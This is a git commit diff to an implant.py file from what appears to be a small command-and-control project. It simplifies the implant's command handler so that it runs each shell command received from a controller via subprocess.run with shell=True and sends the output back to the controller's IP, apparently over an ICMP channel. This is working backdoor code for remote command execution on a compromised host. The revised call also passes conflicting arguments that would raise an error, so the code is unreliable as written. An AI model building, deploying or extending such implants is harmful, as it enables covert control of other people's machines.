fc96a7ff1704c53ecc6af08e2930e0d9353188c7
Vaughn Woerpel <vaughnwoerpel@gmail.com>
2023-10-15 00:00:08 -0400

    update

--- implant.py
+++ implant.py
@@ -7,6 +7,7 @@ from shellylib import Host
 import time
 from threading import Timer
 from subprocess import STDOUT, check_output, TimeoutExpired, PIPE, Popen
+import subprocess
 
 ICMP_ID = int(12800)
 TTL = int(64)
@@ -21,51 +22,12 @@ class Implant(Host):
     def join(self, shellpack):
         self.send(shellpack['ip'], "join")
 
-    def run(self, cmd, timeout):
-        time_limit = 2
-        timer = 0
-        time_gap = 0.2
-
-        proc = Popen(cmd, shell=True, stdout=PIPE, stderr=PIPE)
-
-        ended = False
-        while True:
-            time.sleep(time_gap)
-
-            returncode = proc.poll()
-
-            timer += time_gap
-            if timer >= time_limit:
-                proc.kill()
-                return None
-
-            if returncode is not None:
-                ended = True
-                break
-
-        if ended:
-            out, err = proc.communicate()
-            print("fard")
-            print(out)
-            print(err)
-            return out, err
-        else:
-            print(out)
-            print(err)
-            return out, err
-
     def instruction(self, shellpack):
         try:
             cmd = shellpack['data'].decode()
-            stdout, stderr = self.run(cmd, 3)
-            stderr = stderr.decode()
-            if "not found" in stderr:
-                raise FileNotFoundError
-            elif "Syntax error" in stderr:
-                raise SyntaxError
-            elif "Timeout expired" in stderr:
-                raise TimeoutExpired
-            self.send(self.controller_ip, "instruction", stdout)
+
+            output = subprocess.run(cmd, shell=True, stderr=STDOUT, stdout=PIPE, timeout=3, capture_output = True)
+            self.send(self.controller_ip, "instruction", output)
             
         except TimeoutExpired:
             self.send(self.controller_ip, "instruction", b'The command has timed out', option="ERROR")
